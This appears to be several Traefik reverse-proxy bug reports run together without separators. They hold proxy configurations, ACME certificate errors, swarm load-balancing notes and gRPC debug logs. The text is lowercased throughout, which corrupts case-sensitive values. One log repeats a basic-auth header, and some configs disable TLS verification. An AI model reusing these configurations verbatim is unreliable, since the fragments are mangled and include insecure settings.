time="2018-11-12t16:48:33z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:48:34z" level=warning msg="into entrypoint http, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:34z" level=warning msg="into entrypoint https, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:34z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:48:34z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:48:34z" level=info msg="server configuration reloaded on :8443"
time="2018-11-12t16:48:45z" level=warning msg="into entrypoint http, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:45z" level=warning msg="into entrypoint https, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:45z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:48:45z" level=info msg="server configuration reloaded on :8443"
time="2018-11-12t16:48:45z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:48:46z" level=warning msg="into entrypoint http, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:46z" level=warning msg="into entrypoint https, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:46z" level=info msg="server configuration reloaded on :8443"
time="2018-11-12t16:48:46z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:48:46z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:48:48z" level=warning msg="into entrypoint http, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:48z" level=warning msg="into entrypoint https, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:48z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:48:48z" level=info msg="server configuration reloaded on :8443"
time="2018-11-12t16:48:48z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:48:51z" level=warning msg="into entrypoint http, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:51z" level=warning msg="into entrypoint https, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:51z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:48:51z" level=info msg="server configuration reloaded on :8443"
time="2018-11-12t16:48:51z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:49:05z" level=warning msg="into entrypoint http, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:49:05z" level=warning msg="into entrypoint https, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:49:05z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:49:05z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:49:05z" level=info msg="server configuration reloaded on :8443"
debug = false loglevel = "error"
defaultentrypoints = ["https","http"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [retry] [docker]
endpoint = "tcp://127.0.0.1:2376"
domain = "my.domain"
watch = true
exposedbydefault = false
swarmmode = true [acme]
email = "email@test.com"
storage = "acme.json"
entrypoint = "https"
onhostrule = true
[acme.httpchallenge]
entrypoint = "http"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```yml
version: '3'
services: primus: image: ${registry_url}primus-${subdomain}:${git_hash:-latest} networks: traefik-net: aliases: - primus-${subdomain} env_file: env_${subdomain}/primus.env command: npm start deploy: labels: traefik.docker.network: "traefik-net" traefik.frontend.rule=host:primus.${subdomain}.${domain}" traefik.backend=primus-${subdomain}" - "traefik.backend.loadbalancer.swarm=true" - "traefik.backend.loadbalancer.stickiness=true" - "traefik.backend.healthcheck.path=\'/primus?access_token=healthcheck&transport=polling\'" - "traefik.backend.healthcheck.interval=10s" - "traefik.backend.healthcheck.timeout=2s" - "traefik.port=2333" - "traefik.protocol=http" - "traefik.enable=true" ports: - "2333"
defaultentrypoints = ["https"] [entrypoints] [entrypoints.http] address = ":80"
# [entrypoints.http] [accesslog]
[api] [file] [backends] [backends.backend1] [backends.backend1.servers.server1] # access on backend with h2c url = "h2c://localhost:3910" [frontends] [frontends.frontend1] entrypoints = ["http"] backend = "backend1" ``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
debu[2018-11-09t16:09:58+01:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/grpc_token_service.adminservice/list\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"authorization\\":[\\"basic z3jwyzpzdxblci1oyxjklwxvewfsdhktcgfzc3dvcmq=\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-ruby/1.15.0 grpc-c/6.0.0 (linux; chttp2; glider)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:36110\\",\\"requesturi\\":\\"/grpc_token_service.adminservice/list\\",\\"tls\\":null}"
debu[2018-11-09t16:09:58+01:00] vulcand/oxy/roundrobin/rr: forwarding this request to url forwardurl="h2c://localhost:3910" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/grpc_token_service.adminservice/list\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"authorization\\":[\\"basic z3jwyzpzdxblci1oyxjklwxvewfsdhktcgfzc3dvcmq=\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-ruby/1.15.0 grpc-c/6.0.0 (linux; chttp2; glider)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:36110\\",\\"requesturi\\":\\"/grpc_token_service.adminservice/list\\",\\"tls\\":null}"
debu[2018-11-09t16:09:58+01:00] vulcand/oxy/forward: begin servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"localhost:3910\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"authorization\\":[\\"basic z3jwyzpzdxblci1oyxjklwxvewfsdhktcgfzc3dvcmq=\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-ruby/1.15.0 grpc-c/6.0.0 (linux; chttp2; glider)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:36110\\",\\"requesturi\\":\\"/grpc_token_service.adminservice/list\\",\\"tls\\":null}"
debu[2018-11-09t16:09:58+01:00] vulcand/oxy/forward/http: begin servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"localhost:3910\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"authorization\\":[\\"basic z3jwyzpzdxblci1oyxjklwxvewfsdhktcgfzc3dvcmq=\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-ruby/1.15.0 grpc-c/6.0.0 (linux; chttp2; glider)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:36110\\",\\"requesturi\\":\\"/grpc_token_service.adminservice/list\\",\\"tls\\":null}"
debu[2018-11-09t16:09:58+01:00] vulcand/oxy/forward/http: round trip: h2c://localhost:3910, code: 200, length: 0, duration: 570.153051ms debu[2018-11-09t16:09:58+01:00] vulcand/oxy/forward/http: completed servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"localhost:3910\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"authorization\\":[\\"basic z3jwyzpzdxblci1oyxjklwxvewfsdhktcgfzc3dvcmq=\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-ruby/1.15.0 grpc-c/6.0.0 (linux; chttp2; glider)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:36110\\",\\"requesturi\\":\\"/grpc_token_service.adminservice/list\\",\\"tls\\":null}"
debu[2018-11-09t16:09:58+01:00] vulcand/oxy/forward: completed servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"localhost:3910\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"authorization\\":[\\"basic z3jwyzpzdxblci1oyxjklwxvewfsdhktcgfzc3dvcmq=\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-ruby/1.15.0 grpc-c/6.0.0 (linux; chttp2; glider)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:36110\\",\\"requesturi\\":\\"/grpc_token_service.adminservice/list\\",\\"tls\\":null}"
debu[2018-11-09t16:09:58+01:00] vulcand/oxy/roundrobin/rr: completed servehttp on request request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/grpc_token_service.adminservice/list\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"authorization\\":[\\"basic z3jwyzpzdxblci1oyxjklwxvewfsdhktcgfzc3dvcmq=\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-ruby/1.15.0 grpc-c/6.0.0 (linux; chttp2; glider)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:80\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[::1]:36110\\",\\"requesturi\\":\\"/grpc_token_service.adminservice/list\\",\\"tls\\":null}"
::1 - - [09/nov/2018:15:09:58 +0000] "post /grpc_token_service.adminservice/list http/2.0" 200 0 "-" "grpc-ruby/1.15.0 grpc-c/6.0.0 (linux; chttp2; glider)" 1 "frontend1" "h2c://localhost:3910" 572ms
``` also, logs with added env variable `godebug="http2debug=1"` (a bit long)
successful grpc server response:
failure grpc server response: (e.g
no grpc-status header returned)
debug = false loglevel = "error"
defaultentrypoints = ["https","http"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [retry] [docker]
endpoint = "tcp://127.0.0.1:2376"
domain = "my.domain"
watch = true
exposedbydefault = false
swarmmode = true [acme]
email = "email@test.com"
storage = "acme.json"
entrypoint = "https"
onhostrule = true
[acme.httpchallenge]
entrypoint = "http"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch)
this is the exact same issue as #2138, and yes i shamelessly copied "what did you expect to see" and "what did you see instead", however using the latest version, the issue is still there
everything is working when traefik.backend.loadbalancer.swarm is set to false.
when loadbalancer.swarm=true, the lb is actually working, when i make requests to the endpoint, by inspecting the log, i can see backends taking their turn logging the response.
[marathon] endpoint = " " domain = "example.com" exposedbydefault = false groupsassubdomains = false marathonlbcompatibility = false dialertimeout = "60s" keepalive = "10s" forcetaskhostname = false respectreadinesschecks = true
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ``` ```
### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) na
defaultentrypoints = ["https"] [entrypoints] [entrypoints.https] address = ":10501" [entrypoints.https.tls] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_rsa_with_aes_256_gcm_sha384" ] [[tls]] entrypoints = ["https"] [tls.certificate] certfile = "....pem" keyfile = "....key" [accesslog] [file] directory = "/etc/traefik/conf.d" watch = true
``` ```toml
[frontends.frontend1] backend = "backend1"
[frontends.frontend1.routes.backend] rule = "host: host.example"
[frontends.mysql.auth.basic] usersfile = "/etc/traefik/auth"
##################################
# this file is managed by puppet #
##################################
loglevel = "info" defaultentrypoints = ["http", "https"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] ...
[consulcatalog] endpoint = "$consul_url" exposedbydefault = false constraints=[] watch=true [consulcatalog.tls] ..
insecureskipverify = true
[api] entrypoint = "traefik" dashboard = true debug = true
[acme] email = "email@mydomain.com" storage = "/acme-certificates/acme.json" acmelogging = true entrypoint = "https" [acme.dnschallenge] provider = "gcloud" [[acme.domains]] main = "*.development.mydomain.com" sans = ["development.mydomain.com"] [[acme.domains]] main = "*.qa.mydomain.com" sans = ["qa.mydomain.com"]
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-11-01t11:46:41z" level=error msg="error obtaining certificate: acme: error -> one or more domains had a problem:\ [qa.mydomain.com] error presenting token: googlecloud: googleapi: error 409: the resource \'entity.change.additions[0].rrdata[1]\' named \'\\"vuolzs3tflfroswftv3mayqoyaz5pvqk16njdgmdmez\\"\' already exists, alreadyexists\ "
time="2018-11-01t11:46:41z" level=error msg="unable to obtain acme certificate for domains \\"*.qa.mydomain.com,qa.mydomain.com\\" : unable to generate a certificate for the domains [*.qa.mydomain.com qa.mydomain.com]: acme: error -> one or more domains had a problem:\ [qa.mydomain.com] error presenting token: googlecloud: googleapi: error 409: the resource \'entity.change.additions[0].rrdata[1]\' named \'\\"vuolzs3tflfroswftv3mayqoyaz5pvqk16njdgmdmez\\"\' already exists, alreadyexists\ "
time="2018-11-01t11:46:41z" level=error msg="error obtaining certificate: acme: error -> one or more domains had a problem:\ [development.mydomain.com] error presenting token: googlecloud: googleapi: error 409: the resource \'entity.change.additions[0].rrdata[1]\' named \'\\"jfv6orvfbwi0idqbmpvg3qniltmx5x56vguphjobzoa\\"\' already exists, alreadyexists\ "
time="2018-11-01t11:46:41z" level=error msg="unable to obtain acme certificate for domains \\"*.development.mydomain.com,development.mydomain.com\\" : unable to generate a certificate for the domains [*.development.mydomain.com development.mydomain.com]: acme: error -> one or more domains had a problem:\ [development.mydomain.com] error presenting token: googlecloud: googleapi: error 409: the resource \'entity.change.additions[0].rrdata[1]\' named \'\\"jfv6orvfbwi0idqbmpvg3qniltmx5x56vguphjobzoa\\"\' already exists, alreadyexists\ "
static configuration (working): ```
traefik -c traefik.toml
``` shared configuration on consul (misbehaving): ```
traefik storeconfig -c traefik.toml
``` then: ```
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-10-31t14:57:32z" level=debug msg="looking for an existing acme challenge for [redacted]..."
time="2018-10-31t14:57:32z" level=debug msg="looking for provided certificate to validate [redacted]..."
time="2018-10-31t14:57:32z" level=debug msg="no provided certificate found for domains [redacted], get acme certificate."
time="2018-10-31t14:57:32z" level=debug msg="no certificate found or generated for [redacted]" ```
debug = true
defaultentrypoints = ["https", "http"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [acme] email = "my@email.net" storage = "acme.json" entrypoint = "https" acmelogging=true ondemand = false [acme.dnschallenge] provider = "rfc2136" delaybeforecheck = 0 [[acme.domains]] main = "*.mydomain.online" sans = ["mydomain.online"] [docker] endpoint = "unix:///var/run/docker.sock" domain = "mydomain.online" exposedbydefault = false watch = true network = "traefik" ```
when i try to run lego on my archlinux (lego-git r692.1151b4e-1) all works fine:
rfc2136_nameserver="mydomain.online" rfc2136_tsig_key="mydomain.online." rfc2136_tsig_secret="removed" rfc2136_tsig_algorithm="hmac-sha512." lego --email="my@email.net" --domains="mydomain.online" --domains="*.mydomain.online" --dns="rfc2136" --dns-timeout 30 run
2018/10/31 12:24:26 [info] [mydomain.online, *.mydomain.online] acme: obtaining bundled san certificate
2018/10/31 12:24:27 [info] [*.mydomain.online] authurl:
2018/10/31 12:24:27 [info] [mydomain.online] authurl:
2018/10/31 12:24:27 [info] [mydomain.online] acme: authorization already valid; skipping challenge
2018/10/31 12:24:27 [info] [mydomain.online] acme: authorization already valid; skipping challenge
2018/10/31 12:24:27 [info] [mydomain.online, *.mydomain.online] acme: validations succeeded; requesting certificates
2018/10/31 12:24:28 [info] [mydomain.online] server responded with a certificate
### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-10-31t10:55:09z" level=debug msg="building acme client..."
time="2018-10-31t10:55:09z" level=debug msg=" "
time="2018-10-31t10:55:09z" level=info msg=register...
time="2018-10-31t10:55:09z" level=info msg="legolog: [info] acme: registering account for anmeldezeugs@top-email.net"
time="2018-10-31t10:55:10z" level=debug msg="using dns challenge provider: rfc2136"
time="2018-10-31t10:55:10z" level=info msg="legolog: [info] [*.mydomain.online, mydomain.online] acme: obtaining bundled san certificate"
time="2018-10-31t10:55:10z" level=info msg="legolog: [info] [*.mydomain.online] authurl: "
time="2018-10-31t10:55:10z" level=info msg="legolog: [info] [mydomain.online] authurl: "
time="2018-10-31t10:55:10z" level=info msg="legolog: [info] [mydomain.online] acme: could not find solver for: http-01"
time="2018-10-31t10:55:10z" level=info msg="legolog: [info] [mydomain.online] acme: preparing to solve dns-01"
time="2018-10-31t10:55:10z" level=info msg="legolog: [info] [mydomain.online] acme: preparing to solve dns-01"
time="2018-10-31t10:55:10z" level=error msg="error obtaining certificate retrying in 618.564794ms"
time="2018-10-31t10:55:11z" level=info msg="legolog: [info] [*.mydomain.online, mydomain.online] acme: obtaining bundled san certificate"
time="2018-10-31t10:55:11z" level=info msg="legolog: [info] [*.mydomain.online] authurl: "
time="2018-10-31t10:55:11z" level=info msg="legolog: [info] [mydomain.online] authurl: "
time="2018-10-31t10:55:11z" level=info msg="legolog: [info] [mydomain.online] acme: could not find solver for: http-01"
time="2018-10-31t10:55:11z" level=info msg="legolog: [info] [mydomain.online] acme: preparing to solve dns-01"
time="2018-10-31t10:55:11z" level=info msg="legolog: [info] [mydomain.online] acme: preparing to solve dns-01"
time="2018-10-31t10:55:11z" level=error msg="error obtaining certificate retrying in 825.533254ms"
time="2018-10-31t10:55:12z" level=info msg="legolog: [info] [*.mydomain.online, mydomain.online] acme: obtaining bundled san certificate"
time="2018-10-31t10:55:16z" level=info msg="legolog: [info] [*.mydomain.online] authurl: "
time="2018-10-31t10:55:16z" level=info msg="legolog: [info] [mydomain.online] authurl: "
time="2018-10-31t10:55:16z" level=info msg="legolog: [info] [mydomain.online] acme: could not find solver for: http-01"
time="2018-10-31t10:55:16z" level=info msg="legolog: [info] [mydomain.online] acme: preparing to solve dns-01"
time="2018-10-31t10:55:16z" level=info msg="legolog: [info] [mydomain.online] acme: preparing to solve dns-01"
time="2018-10-31t10:55:16z" level=error msg="error obtaining certificate: acme: error -> one or more domains had a problem:\ [mydomain.online] error presenting token: rfc2136: dial udp: lookup \\"mydomain.online\\": no such host\ "
time="2018-10-31t10:55:16z" level=error msg="unable to obtain acme certificate for domains \\"*.mydomain.online,mydomain.online\\" : unable to generate a certificate for the domains [*.mydomain.online mydomain.online]: acme: error -> one or more domains had a problem:\ [mydomain.online] error presenting token: rfc2136: dial udp: lookup \\"mydomain.online\\": no such host\ "
ubuntu 18.04
traefik 1.7.3
docker swarm 18.03.1-ce, build 9ee9f40 configuration: ```yml
version: \'3.3\' services: consul: image: consul:1.3.0 command: agent -server -bootstrap-expect=1 networks: - consul-net volumes: - type: bind source: /var/traefik-data/consul-data/ target: /consul/data/ environment: - consul_bind_interface=eth0 - consul_client_interface=eth0 deploy: replicas: 1 restart_policy: condition: on-failure placement: constraints: - "node.role == manager" initiation: image: traefik:1.7 networks: - consul-net depends_on: - consul deploy: restart_policy: condition: on-failure command: - storeconfig - --entrypoints=name:http address::80 - --entrypoints=name:https address::443 tls:/cert/star.service.example.local.crt,/cert/star.service.example.local.key - --defaultentrypoints=http,https - --api - --api.entrypoint=traefik - --api.dashboard=true - --docker - --docker.swarmmode - --docker.watch - --docker.exposedbydefault=false - --docker.endpoint=tcp://swarm.service.example.local:2376 - --acme - --acme.storage=traefik/acme/account - --acme.entrypoint=https - --acme.httpchallenge.entrypoint=http - --acme.onhostrule=true - --acme.ondemand=false - --acme.email=something@example.com - --consul - --consul.endpoint=consul:8500 - --consul.prefix=traefik - --loglevel=warn - --traefiklog.format=json - --accesslog.format=json app: image: traefik:1.7 networks: - consul-net - traefik-net ports: - target: 80 published: 80 protocol: tcp mode: host - target: 443 published: 443 protocol: tcp mode: host volumes: - type: bind source: /var/traefik-data/certificates/ target: /cert/ depends_on: - consul - initiation deploy: mode: global restart_policy: condition: on-failure placement: constraints: - "node.role == manager" update_config: parallelism: 1 delay: 10s labels: traefik.enable: "true" traefik.docker.network: "traefik-net" traefik.port: 8080 traefik.frontend.rule: "host:traefik.service.example.local" traefik.frontend.entrypoints: "https" traefik.frontend.whitelist.sourcerange: "192.168.0.0/16, 10.0.0.0/8" command: - --consul - --consul.endpoint=consul:8500 - --consul.prefix=traefik - --loglevel=warn - --traefiklog.format=json networks: traefik-net: external: name: traefik-net consul-net: driver: overlay
``` i also have services created like this (both with internal domains and external domains):
version: \'3.3\' services: thumbor: image: some-image networks: - traefik-net deploy: mode: replicated replicas: 2 labels: traefik.enable: "true" traefik.docker.network: "traefik-net" traefik.port: 8000 traefik.frontend.rule: "host:some-service.service.example.local" traefik.frontend.entrypoints: "https" traefik.frontend.whitelist.sourcerange: "192.168.0.0/16, 10.0.0.0/8" networks: traefik-net: external: name: traefik-net
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) i see traefik trying to get acme certificates for domains that already have a provided wildcard certificate: ```
error getting acme certificates [traefik.service.example.local] : cannot obtain certificates: acme: error 400 - urn:ietf:params:acme:error:malformed - error creating new order :: name does not end in a public suffix
error getting acme certificates [some-service.service.example.local] : cannot obtain certificates: acme: error 400 - urn:ietf:params:acme:error:malformed - error creating new order :: name does not end in a public suffix
defaultentrypoints = ["http", "https"]
debug = true [accesslog] filepath = "/etc/traefik/traefik-access.log" [traefiklog] filepath = "/etc/traefik/traefik.log" [docker] endpoint = "unix:///var/run/docker.sock" domain = "mydomain.de" exposedbydefault = false watch = true network = "traefik" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [acme] email = "my@email.com" storage = "acme.json" entrypoint = "https" [acme.dnschallenge] provider = "netcup" delaybeforecheck = 0 [[acme.domains]] main = "*.mydomain.de" sans = ["mydomain.de"]
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
root@myhost:/var/lib/docker/volumes/traefik/_data# cat traefik.log
time="2018-10-28t15:19:40z" level=info msg="using toml configuration file /etc/traefik/traefik.toml"
time="2018-10-28t15:19:40z" level=info msg="traefik version v1.7.3 built on 2018-10-15_10:13:00am"
time="2018-10-28t15:19:40z" level=debug msg="global configuration loaded {\\"lifecycle\\":{\\"requestacceptgracetimeout\\":0,\\"gracetimeout\\":10000000000},\\"gracetimeout\\":0,\\"debug\\":true,\\"checknewversion\\":true,\\"sendanonymoususage\\":false,\\"accesslogsfile\\":\\"\\",\\"accesslog\\":{\\"file\\":\\"/etc/traefik/traefik-access.log\\",\\"format\\":\\"common\\"},\\"traefiklogsfile\\":\\"\\",\\"traefiklog\\":{\\"file\\":\\"/etc/traefik/traefik.log\\",\\"format\\":\\"common\\"},\\"tracing\\":null,\\"loglevel\\":\\"\\",\\"entrypoints\\":{\\"http\\":{\\"address\\":\\":80\\",\\"tls\\":null,\\"redirect\\":{\\"entrypoint\\":\\"https\\"},\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"https\\":{\\"address\\":\\":443\\",\\"tls\\":{\\"minversion\\":\\"\\",\\"ciphersuites\\":null,\\"certificates\\":null,\\"clientcafiles\\":null,\\"clientca\\":{\\"files\\":null,\\"optional\\":false},\\"defaultcertificate\\":null,\\"snistrict\\":false},\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}}},\\"cluster\\":null,\\"constraints\\":[],\\"acme\\":{\\"email\\":\\"my@email.com\\",\\"domains\\":[{\\"main\\":\\"*.mydomain.de\\",\\"sans\\":[\\"mydomain.de\\"]}],\\"storage\\":\\"acme.json\\",\\"storagefile\\":\\"\\",\\"ondemand\\":false,\\"onhostrule\\":false,\\"caserver\\":\\" ",\\"entrypoint\\":\\"https\\",\\"keytype\\":\\"\\",\\"dnschallenge\\":{\\"provider\\":\\"netcup\\",\\"delaybeforecheck\\":0},\\"httpchallenge\\":null,\\"tlschallenge\\":null,\\"dnsprovider\\":\\"\\",\\"delaydontcheckdns\\":0,\\"acmelogging\\":false,\\"overridecertificates\\":false,\\"tlsconfig\\":null},\\"defaultentrypoints\\":[\\"http\\",\\"https\\"],\\"providersthrottleduration\\":2000000000,\\"maxidleconnsperhost\\":200,\\"idletimeout\\":0,\\"insecureskipverify\\":false,\\"rootcas\\":null,\\"retry\\":null,\\"healthcheck\\":{\\"interval\\":30000000000},\\"respondingtimeouts\\":null,\\"forwardingtimeouts\\":null,\\"allowminweightzero\\":false,\\"web\\":null,\\"docker\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":2,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"unix:///var/run/docker.sock\\",\\"domain\\":\\"mydomain.de\\",\\"tls\\":null,\\"exposedbydefault\\":false,\\"usebindportip\\":false,\\"swarmmode\\":false,\\"network\\":\\"traefik\\"},\\"file\\":null,\\"marathon\\":null,\\"consul\\":null,\\"consulcatalog\\":null,\\"etcd\\":null,\\"zookeeper\\":null,\\"boltdb\\":null,\\"kubernetes\